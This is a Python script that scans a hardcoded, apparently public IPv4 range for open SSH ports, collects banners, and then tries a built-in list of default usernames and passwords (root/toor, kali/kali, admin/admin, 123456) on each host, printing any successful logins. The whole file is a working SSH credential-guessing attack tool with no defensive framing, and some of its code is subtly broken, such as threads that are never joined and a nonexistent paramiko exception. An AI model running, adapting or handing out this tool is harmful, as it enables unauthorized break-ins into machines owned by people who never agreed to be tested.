import threading
import socket
import ipaddress
import paramiko
from paramiko.ssh_exception import SSHException

def create_ip_ranges(ip_range_input):
    if '-' in ip_range_input:
        start_ip, end_ip = ip_range_input.split('-')
        return list(ipaddress.summarize_address_range(ipaddress.IPv4Address(start_ip.strip()), ipaddress.IPv4Address(end_ip.strip())))
    elif '/' in ip_range_input:
        return list(ipaddress.ip_network(ip_range_input).subnets())
    else:
        return [ipaddress.ip_network(ip_range_input)]

def scan_ips(ip_ranges_input):
    ip_ranges = create_ip_ranges(ip_ranges_input)

    ip_data = {}
    for ip_range in ip_ranges:
        for ip in ip_range:
            ip_data[str(ip)] = {"port_22_open": False}
            scan_thread = threading.Thread(target=scan_port, args=(str(ip), 22, ip_data))
            scan_thread.start()

    return ip_data

def scan_port(ip, port, ip_data):
    print(f"Scanning IP: {ip}")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(1)
    result = s.connect_ex((ip, port))

    if result == 0:
        print(f"{ip} - Port {port} is open.")
        ip_data[ip]["port_22_open"] = True

def grab_banner_data(ip_data):
    banners = {}
    for ip, data in ip_data.items():
        if data["port_22_open"]:
            banner = get_banner(ip)
            if banner:
                banners[ip] = {"banner": banner}

    return banners

def get_banner(ip):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((ip, 22))
        banner = s.recv(1024).decode('utf-8').strip()
        return banner
    except Exception as e:
        print(f"Exception occurred while getting banner for {ip}: {e}")
        return None

def ssh_login_attempt(ip, username, password):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(ip, username=username, password=password, timeout=5, banner_timeout=5, allow_agent=False, look_for_keys=False)
        return True
    except SSHException as e:
        print(f"SSHException occurred at {ip}: {e}")
        return False
    except paramiko.ssh_exception.EOFError as e:
        # Additional handling for the EOFError
        print(f"EOFError occurred at {ip}: {e}")
        return False
    except:
        return False

def attempt_ssh_logins(ips_and_banners):
    usernames = ["kali", "admin", "root", "ubuntu"]
    passwords = ["kali", "admin", "toor", "123456", "qwerty", "debian"]

    for ip, banner_data in ips_and_banners.items():
        success = False
        for username in usernames:
            if success:
                break
            for i in range(6):
                password = passwords[i]
                if ssh_login_attempt(ip, username, password):
                    print(f"Successful login: {ip} - {username} - {password}")
                    success = True
                    break
                if i == 2:
                    print(f"[{ip}] Disconnecting and reconnecting to try the other 3 passwords.")
                    reconnect_attempts = 0
                    while reconnect_attempts < 3:
                        if ssh_login_attempt(ip, 'invalid_user', 'invalid_pass'):
                            break
                        reconnect_attempts += 1

        if not success:
            print(f"Failed to log in to {ip}")

def main():
    # change the input_ip_ranges to a valid input range
    input_ip_ranges = "72.23.1.1-72.23.10.255"
    ip_data = scan_ips(input_ip_ranges)
    ips_and_banners = grab_banner_data(ip_data)
    attempt_ssh_logins(ips_and_banners)

if __name__ == "__main__":
    main()
